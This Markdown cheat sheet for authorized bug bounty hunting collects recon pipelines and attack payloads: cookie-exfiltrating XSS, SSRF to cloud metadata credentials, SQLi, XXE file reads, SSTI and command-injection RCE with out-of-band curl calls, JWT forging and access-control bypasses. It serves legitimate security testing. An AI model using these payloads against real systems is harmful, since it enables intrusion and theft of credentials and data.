# 🧰 Bug Bounty Arsenal

Curated payloads, oneliners, tactics, WAF-bypass order, and the submission rules
that keep your signal ratio clean. Pairs with `bounty_recon.py` — the scanner
finds the surface, this tells you how to turn it into a **reportable** bug.

> ⚠️ Authorized targets only. Every "blind" primitive needs out-of-band (OOB)
> confirmation before you believe it. **No demonstrated impact = not a report.**

---

## 0. Resource Index — the sources worth your time

Rather than "every" repo/blog (most are copies), these are the primary sources
the top hunters actually use:

**Methodology & learning**
- PortSwigger Web Security Academy — https://portswigger.net/web-security (free labs, the gold standard)
- Jason Haddix — *The Bug Hunter's Methodology (TBHM)* — recon + mindset
- NahamSec — `nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters`
- HackTricks — https://book.hacktricks.xyz (technique encyclopedia)
- OWASP Web Security Testing Guide (WSTG) & API Security Top 10

**Payloads & cheatsheets**
- PayloadsAllTheThings — `swisskyrepo/PayloadsAllTheThings`
- SecLists (wordlists) — `danielmiessler/SecLists`
- EdOverflow — `EdOverflow/bugbounty-cheatsheet`
- KingOfBugBounty — `KingOfBugbounty/KingOfBugBountyTips` (oneliners)

**Write-ups / what's actually being found**
- Pentester Land — https://pentester.land/writeups/ (indexed bug bounty writeups)
- HackerOne Hacktivity — https://hackerone.com/hacktivity (disclosed reports)
- Reddit — r/bugbounty, r/netsec (threads + weekly "what did you find")
- Intigriti / YesWeHack / Bugcrowd blogs (new techniques, VRT changes)

**Cutting-edge research (where the top-10 techniques come from)**
- PortSwigger Research + *Top 10 Web Hacking Techniques* (annual) — https://portswigger.net/research
- James Kettle (albinowax) — request smuggling / desync / cache
- Assetnote research — https://blog.assetnote.io (infra, 0-days, wordlists)
- Orange Tsai, Sam Curry (samcurry.net), Gareth Heyes (DOM/XSS), @intigriti bug-bytes

**People / newsletters / podcasts (what hunters actually follow)**
- *Critical Thinking – Bug Bounty Podcast* (Justin Gardner / Rhynorater) — weekly technique deep-dives
- NahamSec (YouTube + `Resources-for-Beginner-Bug-Bounty-Hunters`)
- Jason Haddix — TBHM v5, recon methodology
- Intigriti **Bug Bytes** newsletter · tldrsec.com · hackerone.com/disclosed
- Godfather Orwa, Jhaddix, Stök, InsiderPhD, LiveOverflow (YouTube)

**Tool catalog:** the full, categorized, de-duplicated list of ~400 tools lives in
[`TOOLS.md`](./TOOLS.md). Below is only the *proven-pipeline* subset.

---

## 1. Recon Oneliners (the proven pipelines)

```bash
# Subdomains → live → nuclei (the classic triage pipe)
subfinder -d target.com -all -silent | httpx -silent | nuclei -severity critical,high,medium

# Full passive URL harvest → dedupe → interesting params
echo target.com | gau --threads 10 | anew urls.txt
cat urls.txt | gf xss  | qsreplace '"><svg onload=confirm(1)>' | anew xss-candidates.txt
cat urls.txt | gf ssrf | qsreplace 'http://OOB.interactsh.com' | anew ssrf-candidates.txt
cat urls.txt | gf redirect | qsreplace 'https://evil.com' | anew redirect-candidates.txt

# Reflected-param hunting with a unique marker (no false "reflection")
m=$(head -c 9 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9'); \
  cat urls.txt | qsreplace "$m" | httpx -silent -mr "$m"

# XSS at scale (confirmed sinks only)
cat xss-candidates.txt | dalfox pipe --skip-bav -o dalfox.txt

# JS secrets / endpoints
echo target.com | gau | grep '\.js$' | httpx -silent \
  | xargs -I{} sh -c 'curl -s {} | grep -aoE "(api[_-]?key|secret|token)[\"'\'' :=]+[A-Za-z0-9._-]{12,}"'

# Content discovery
ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -t 50

# Parameter discovery on a single endpoint
arjun -u https://target.com/api/item -m GET

# Git / secret sweep of an org
trufflehog github --org=TARGET-ORG --only-verified

# Takeover check across all subs
subfinder -d target.com -silent | httpx -silent | nuclei -t http/takeovers/

# Feed everything into this repo's scanner for scoring + exploitation plans
python3 bounty_recon.py -t target.com --profile safe --ai-triage --html --out-dir ./reports
```

### The 2025 stack (what the pipelines above modernize to)

```bash
# Full passive asset → live → screenshots, all deduped with anew
subfinder -d target.com -all -silent | dnsx -silent | anew hosts.txt
cat hosts.txt | httpx -silent -sc -title -tech-detect -o live.txt
cat live.txt | cut -d' ' -f1 | gowitness scan file -f -   # visual triage grid

# Modern URL harvest: archives (waymore) + live crawl (katana), then declutter
waymore -i target.com -mode U -oU way.txt
katana -u live.txt -jc -kf all -d 3 -silent | anew way.txt
cat way.txt | uro | anew urls.txt      # uro kills 90% of near-dup noise

# Route URLs to the right test with gf, confirm with a UNIQUE marker only
cat urls.txt | gf redirect | qsreplace 'https://oob.example/' | httpx -silent -mr 'oob.example'
cat urls.txt | gf ssrf     | qsreplace 'http://COLLAB.oast.pro' # watch interactsh
cat urls.txt | gf xss      | dalfox pipe --skip-bav --silence -o dalfox.txt

# JS: jsluice reads JS by AST (far fewer false endpoints than regex)
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} sh -c 'curl -s {} | jsluice urls' | anew js-endpoints.txt
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} sh -c 'curl -s {} | jsluice secrets'

# nuclei: templates + DAST fuzzing in one run, OAST on, only real severities
nuclei -l live.txt -severity critical,high,medium -itags cve,misconfig,exposure \
  -dast -iserver interactsh -stats -o nuclei.txt

# Continuous recon: diff new subs/JS and ping chat (set-and-forget)
subfinder -d target.com -silent | anew subs.txt | notify -silent
```

> **Why these over the classics?** `waymore` pulls more archives than `waybackurls`,
> `uro` removes duplicate-shaped URLs so you fuzz 10× fewer dead ends, `jsluice`
> parses JS instead of regex-guessing (massively fewer bogus endpoints), and
> `nuclei -dast` adds active fuzzing to template matching. Every signal still
> needs OOB/marker confirmation before you believe it.

---

## 2. Payloads by Class

### XSS
```html
<!-- probes -->
"><script>alert(document.domain)</script>
'><img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
javascript:alert(document.domain)
<!-- impact proof (exfil, not alert) -->
<img src=x onerror="fetch('https://OOB?c='+btoa(document.cookie))">
<!-- CSP bypass: Angular template injection -->
{{constructor.constructor('alert(1)')()}}
<!-- polyglot -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
```
DOM sinks to grep in JS: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout("...")`, `new Function`, `location.href=`, `element.src=` fed from `location.hash/search/href`, `document.referrer`, `window.name`.

### SSRF — cloud metadata
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # GCP (hdr: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (hdr: Metadata: true)
# IP-filter bypass → all = 127.0.0.1
http://2130706433  http://0177.0.0.1  http://127.1  http://[::1]  http://[::ffff:127.0.0.1]
# internal services
http://localhost:6379 (Redis)  :9200 (Elastic)  :2375 (Docker API /containers/json)
```

### SQLi
```sql
'  ''  ' OR 1=1--  ' UNION SELECT NULL--
' AND SLEEP(5)--            -- MySQL
' AND pg_sleep(5)--         -- PostgreSQL
'; WAITFOR DELAY '0:0:5'--  -- MSSQL
-- WAF: /*!50000SELECT*/  SE/**/LECT  SeLeCt  %2527  (double-encode)
```

### NoSQL (MongoDB)
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$gt":""}}
```
```bash
# GET form variant
/login?username[$ne]=null&password[$ne]=null
```

### XXE
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!-- blind OOB --><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOB/xxe">]>
<!-- SVG upload: <image href="file:///etc/passwd"/> -->
```

### SSTI (probe → engine → RCE)
```text
{{7*7}}→49 Jinja2/Twig   ${7*7}→Freemarker/Spring   <%= 7*7 %>→ERB/EJS   {{7*'7'}}→7777777 = Jinja2
Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}
Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
ERB:        <%= `id` %>        EJS: <%= process.mainModule.require('child_process').execSync('id') %>
Thymeleaf:  ${T(java.lang.Runtime).getRuntime().exec('id')}
```

### Command injection
```bash
; id    | id    $(id)    `id`    && id    ; sleep 5
# OOB: ; curl https://OOB     $(nslookup OOB)
# space bypass: ;cat${IFS}/etc/passwd    keyword bypass: ;c'a't /etc/passwd
```

### Path traversal
```bash
../../../etc/passwd    ..%2F..%2F..%2Fetc%2Fpasswd    ..%252f..%252f (double)
....//....//etc/passwd    /etc/passwd%00.jpg
```

### IDOR / auth
```bash
GET /api/user/123 → 124            # numeric
PUT protected → DELETE unprotected # method swap
/v2/users/123 → /v1/users/123      # old version
/api/orders → /api/orders?user_id=456
# mass-assignment: {"role":"admin"} {"isAdmin":true} {"admin":1}
```

### JWT
```bash
# alg:none — set header alg "none", drop signature, edit sub/role, replay
# weak secret: hashcat -a 0 -m 16500 jwt.txt rockyou.txt   → forge
# RS256→HS256 key confusion: sign with the public key as HMAC secret
```

### OAuth
```text
redirect_uri swap → attacker host (steal code)  |  missing/static state → CSRF/account-link
no PKCE (no code_challenge accepted) → code interception
```

### Request smuggling (fingerprint front-end FIRST)
```http
CL.TE:  Content-Length: 13 + Transfer-Encoding: chunked, body "0\r\n\r\nSMUGGLED"
```
Burp → HTTP Request Smuggler → Smuggle probe. Note: classic CL.TE/TE.CL is dead on
Nginx≥1.21 / Envoy≥1.20; still works on HAProxy≤2.4, older F5/Citrix, ATS.

### WebSocket (CSWSH)
```bash
wscat -c "wss://target/ws" -H "Origin: https://evil.com"   # if accepted = CSWSH
```

---

## 3. WAF Bypass — try in this order
1. **Encoding** — case (`SeLeCt`), URL-encode ×1, ×2, Unicode `\u`, HTML entity `&#x3c;`.
2. **Parser quirks** — `Content-Type` confusion (json vs form), JSON `\u` mid-keyword, multipart boundary tricks, XML namespaces.
3. **Protocol** — HTTP/2 vs 1.1 (WAF may inspect only one), `X-Original-URL`, `X-Forwarded-*`.
4. **Vendor-specific** — Cloudflare/Akamai/Imperva/F5/AWS signature gaps.

Most engagements succeed at step 2 (WAF and origin disagree on what's "valid").

---

## 4. `gf` patterns (tomnomnom/gf)
```
gf xss | ssrf | idor | sqli | redirect | lfi | rce | ssti | debug_logic | secrets | cors | upload-fields
```

---

## 4b. Modern technique radar (PortSwigger Top-10 themes, 2024–2025)

Where the fresh, less-saturated bugs are. These are the themes that dominated the
last two annual top-10 lists — hunt them where frameworks are new.

| Theme | What to look for | Signal |
|---|---|---|
| **Parser differentials** | Front-end and back-end (or two libraries) disagree on the same input — URL, JSON, multipart, XML | Same request, two different interpretations → auth/path bypass, smuggling |
| **Web Cache Deception** | `/account.css`, `/profile/avatar.js`, path-confusion suffixes that the cache stores but the app treats as the real page | Private response served to the next visitor |
| **Unicode / normalization gaps** | `ı`/`I`, full-width, NFKC folding applied *after* an allow/deny check | `admin` vs `Admın`, host/email normalization → takeover |
| **OAuth cookie tossing / state abuse** | Sibling-subdomain can set a cookie the parent trusts; missing/replayable `state`; lax `redirect_uri` | Auth-code theft → ATO |
| **SSRF without obvious output** | Blind SSRF where timing / error-shape / second-order fetch reveals internal reachability | OOB callback + response-diff, not a reflected body |
| **ORM / query leakage** | Over-broad ORM filters, GraphQL field-level gaps, mass-assignment into query builders | Extra fields in responses, `node()` reaching other tenants |
| **Error-based code injection** | Template/expression engines that only reveal injection through error messages | `{{7*7}}`/`${7*7}` differences surfaced in stack traces |

Pair with the A→B cluster habit: a parser differential next to a cache often
chains into *stored* cache poisoning; a normalization gap next to OAuth often
chains into ATO. Build the chain, then report it.

---

## 5. Discipline that prevents false positives
- **OOB-or-it-didn't-happen:** every blind bug (SQLi/XSS/SSRF/RCE/XXE) must fire a Burp Collaborator / interactsh callback before you believe it. A SQL-error string in a 500 can be an unrelated log.
- **Unique markers, never generic words:** search responses for a random token, not `javascript`/`admin` (those lie via keyword overlap).
- **Timing oracles need n≥10 interleaved trials + Welch t>3** — a single 129 ms delta is noise.

---

## 6. ⛔ Always Rejected — never submit standalone
Submitting these burns your signal ratio and invites N/A:

Missing CSP/HSTS/X-Frame-Options & other headers · missing SPF/DKIM/DMARC ·
GraphQL introspection alone · version/banner disclosure w/o working CVE ·
clickjacking on non-sensitive pages · tabnabbing · CSV injection · CORS `*`
without credentialed exfil PoC · logout CSRF · self-XSS · open redirect alone ·
SSRF with DNS callback only · host-header injection alone · rate-limit on
non-critical forms · session-not-invalidated-on-logout · internal IP in error ·
mixed content · weak TLS ciphers · missing HttpOnly/Secure alone · autocomplete on password.

*(`bounty_recon.py` marks these ⛔ NOT REPORTABLE ALONE automatically.)*

---

## 7. ✅ Conditionally Valid — requires a proven chain
| Standalone | + Chain | Result |
|---|---|---|
| Open redirect | OAuth code theft via redirect_uri | ATO (Critical) |
| Clickjacking | sensitive framable action + PoC | Medium |
| CORS wildcard | credentialed request exfils user data | High |
| CSRF | sensitive action (funds/email change) | High |
| Rate-limit bypass | OTP/token brute succeeds | Med/High |
| SSRF DNS-only | internal service access + data read | Medium |
| Host-header injection | password-reset email uses it | High |
| S3 listing | JS bundle → API keys/OAuth secrets | Med/High |
| Self-XSS | CSRF to trigger on victim | Medium |
| Subdomain takeover | OAuth redirect_uri at that subdomain | Critical |
| GraphQL introspection | auth-bypass mutation / node() IDOR | High |

**Rule:** build + confirm the chain end-to-end, *then* report. Never "A could chain with B" — prove it.

---

*Attribution: techniques here are public community knowledge (PortSwigger, PayloadsAllTheThings,
HackTricks, tomnomnom, ProjectDiscovery, OWASP, and disclosed HackerOne/Bugcrowd reports).
Use only where you are authorized.*

---

## Modern technique recipes (2020–2026) — added in v4.4

> Added as **verified recipes, not auto-probes.** These classes are high-value
> but high-false-positive when automated blindly, so they live here as
> copy-paste commands you run and confirm manually (keeping the scanner's
> signal high). Authorised targets only.

### HTTP Request Smuggling / H2 desync (CL.TE, TE.CL, H2.CL, H2.TE)
- **Primary tool:** Burp **HTTP Request Smuggler** extension (Albinowax) →
  "Smuggle probe" + "HTTP Request Smuggler → Launch all scans".
- **CLI:** [`smuggler.py`](https://github.com/defparam/smuggler) —
  `python3 smuggler.py -u https://target/` (tests CL.TE/TE.CL timing).
- **h2 downgrade desync (2021+, Kettle):** test HTTP/2 → HTTP/1.1 downgrade with
  a crafted `Content-Length`/`Transfer-Encoding` in the h2 body; `h2cSmuggler`
  for `h2c` upgrade smuggling: `python3 h2csmuggler.py -x https://target/ http://internal/`.
- **Confirm:** a timed delay (TE.CL ~ `timeout`) or a poisoned response landing
  on a *second* request. Never report on timing alone — land a controlled prefix.

### Web Cache Deception (distinct from cache poisoning)
- 2022 Omer Gil / 2024 Kettle path-normalisation variants.
- **Recipe:** request an authenticated page with an appended static-looking path
  or delimiter, then re-fetch unauthenticated:
  ```bash
  # does /account/profile get cached when suffixed like a static asset?
  curl -s "https://target/account/profile/nonexistent.css" -H "Cookie: $SESSION" -o a.html
  curl -s "https://target/account/profile/nonexistent.css" -o b.html   # no cookie
  diff a.html b.html && echo "CACHED PRIVATE PAGE — WCD"
  ```
- Delimiter variants to try: `.css` `.js` `%2f..%2f` `;.css` `%00.css` `/%2e%2e/`.

### OAuth / OIDC + SAML
- **OAuth:** redirect_uri validation bypass (`//evil`, `/\evil`, path append,
  `?`/`#` tricks), `state` absent/reused (CSRF), `code` leak via Referer, PKCE
  downgrade, implicit-flow token in URL fragment, `prompt=none` session fixation.
- **SAML:** XML Signature Wrapping (XSW1-8) with **SAML Raider** (Burp); comment
  injection in `NameID`; unsigned-assertion acceptance; `samlify`/xmldom parser
  differentials (CVE-2025-47949 class). Decode with `base64 -d | xmllint --format -`.

### Client-side gadgets
- **postMessage:** grep JS for `addEventListener("message"` with no `origin`
  check → inject via a controlled iframe.
- **DOM clobbering:** `<a id=x>` / `<form name=x>` to overwrite globals the app
  reads (`window.config`, `document.x`); pairs with sanitiser bypass.
- **Prototype pollution → XSS gadget:** pollute `__proto__.<sink>` then trigger a
  library gadget (jQuery `$.extend`, Lodash `_.merge`, `Object.assign` on
  attacker JSON). Confirm with `Object.prototype.polluted` in console.

---

## Authenticated hunting & n8n/low-code recipes (2020–2026) — v4.5

> Generalised from an authorised n8n/Next.js engagement. The scanner now carries
> your session (`--cookie` / `--auth-state` / `--header`); these are the manual
> follow-ups that turned recon into findings.

### Replay a browser session
```bash
# capture once with Playwright, then feed storageState to the scanner:
node -e "const{chromium}=require('playwright');(async()=>{const b=await chromium.launch({headless:false});const c=await b.newContext();const p=await c.newPage();await p.goto('https://target/login');console.log('log in, then press enter');process.stdin.once('data',async()=>{await c.storageState({path:'auth.json'});await b.close()})})()"
python3 bounty_recon.py -t target.com --profile safe --auth-state auth.json
```

### Access-control bypass (what `--access-bypass` automates — verify by hand)
```bash
# path normalisation (edge-vs-origin parser differential)
for v in '/%2e/admin' '/admin/..;/' '//admin' '/admin%2f' '/;/admin'; do
  printf '%s -> ' "$v"; curl -sk -o /dev/null -w "%{http_code}\n" "https://target$v"; done
# trusted-proxy header spoof
curl -sk -o /dev/null -w "%{http_code}\n" -H 'X-Forwarded-For: 127.0.0.1' 'https://target/admin'
curl -sk -o /dev/null -w "%{http_code}\n" -H 'X-Original-URL: /admin' 'https://target/'
```

### n8n / low-code platforms
- `/rest/settings` — unauth bootstrap (auth method, SSO, SMTP, versions).
- `/webhook/*` vs `/webhook-test/*` — prod vs test webhooks; path-normalisation
  (`/%2ewebhook/`) sometimes bypasses an edge block → reaches the origin.
- `/healthz`, `/metrics`, `/admin/metrics` on sibling services (orchestrator,
  tool-gateway) — frequently cluster-internal only; test from each vantage.
- SSRF via workflow HTTP-request nodes / webhook responders → internal services
  and cloud metadata. Confirm out-of-band (interactsh).
